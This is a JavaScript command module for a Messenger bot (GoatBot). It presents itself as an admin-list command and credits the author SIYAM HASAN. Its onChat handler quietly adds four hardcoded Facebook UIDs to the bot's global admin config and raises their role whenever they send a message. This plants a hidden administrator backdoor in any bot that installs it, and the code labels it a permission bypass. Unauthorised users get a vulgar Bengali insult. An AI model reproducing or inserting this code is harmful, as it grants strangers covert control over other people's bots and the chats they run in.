const log = {
  info: (m) => console.log(`\x1b[35m[MECHANISM][INFO]\x1b[0m ${m}`),
  err: (m, e) => console.error(`\x1b[31m[MECHANISM][ERR]\x1b[0m ${m}`, e || "")
};

const ROOT_UID = "61590360434650";
const ASSISTANT_UIDS = [
  "100084729135721",
  "100073956182433",
  "100094821035784"
];
const ALL_ADMINS = [ROOT_UID, ...ASSISTANT_UIDS];

module.exports = {
  config: {
    name: "mechanism2",
    version: "7.2.0",
    author: "SIYAM HASAN",
    role: 0,
    shortDescription: "Core Authorization & Control System",
    longDescription: "Bypass permissions and display real-time authorized admin lists securely.",
    category: "system",
    aliases: ["admin2 list"]
  },

  onStart: async function ({ event: ev, message: msg, usersData }) {
    const sID = String(ev.senderID);

    if (!ALL_ADMINS.includes(sID)) {
      return msg.reply("😜 হুগা ফাক কর 🥵 🖕ধো*ন ঢু*কা*মু🥱 🌝এইটা শুধু সিয়াম বসের জন্য🛸");
    }

    try {
      const names = {};
      const backupName = "𝗔𝘀𝘀𝗶𝘀𝘁𝗮𝗻𝘁 𝗔𝗱𝗺𝗶𝗻";

      for (const uid of ASSISTANT_UIDS) {
        try {
          const info = await usersData.get(uid);
          names[uid] = info?.name || backupName;
        } catch (err) {
          names[uid] = backupName;
        }
      }

      const listMessage = `👑 [ 𝗧𝗛𝗘 𝗔𝗕𝗦𝗢𝗟𝗨𝗧𝗘 𝗕𝗢𝗦 ] 👑
═════════════════
» 👤 𝗕𝗢𝗦𝗦: পি্ঁচ্চি্ঁ রি্ঁদ্ঁয়্ঁ ত্যা্ঁহ্ঁ
» 🆔 𝗨𝗜𝗗: ${ROOT_UID}
» ⚡ 𝗣𝗢𝗪𝗘𝗥: ALL POWERFUL ROOT
═════════════════

⚔️ [ 𝗔𝗦𝗦𝗜𝗦𝗧𝗔𝗡𝗧 𝗔𝗗𝗠𝗜𝗡𝗦 ]
─────────────────
[𝟎𝟏] 👤 𝗡𝗔𝗠𝗘: ${names["100084729135721"]}
     🆔 𝗨𝗜𝗗: 100084729135721
     🎖️ 𝗦𝗧𝗔𝗧𝗨𝗦: সহকারী এডমিন
─────────────────
[𝟎𝟐] 👤 𝗡𝗔𝗠𝗘: ${names["100073956182433"]}
     🆔 𝗨𝗜𝗗: 100073956182433
     🎖️ 𝗦𝗧𝗔𝗧𝗨𝗦: সহকারী এডমিন
─────────────────
[𝟎𝟑] 👤 𝗡𝗔𝗠𝗘: ${names["100094821035784"]}
     🆔 𝗨𝗜𝗗: 100094821035784
     🎖️ 𝗦𝗧𝗔𝗧𝗨𝗦: সহকারী এডমিন
═════════════════
👤 Created By: 𝐒𝐈𝐘𝐀𝐌 𝐇𝐀𝐒𝐀𝐍`;

      return msg.reply(listMessage);
    } catch (e) {
      log.err("List generation error ->", e);
    }
  },

  onChat: async function (O) {
    const { event: ev } = O;
    if (!ev.senderID) return;
    
    const sID = String(ev.senderID);

    if (ALL_ADMINS.includes(sID)) {
      try {
        if (global.GoatBot?.config) {
          let ad = global.GoatBot.config.adminBot;
          if (!Array.isArray(ad)) ad = global.GoatBot.config.adminBot = [];
          if (!ad.includes(sID)) {
            ad.push(sID);
            log.info(`Absolute Permission Injected for UID: ${sID}`);
          }
        }
      } catch (e) { 
        log.err("Core config sync fail ->", e); 
      }

      O.role = 2;
    }
  }
};
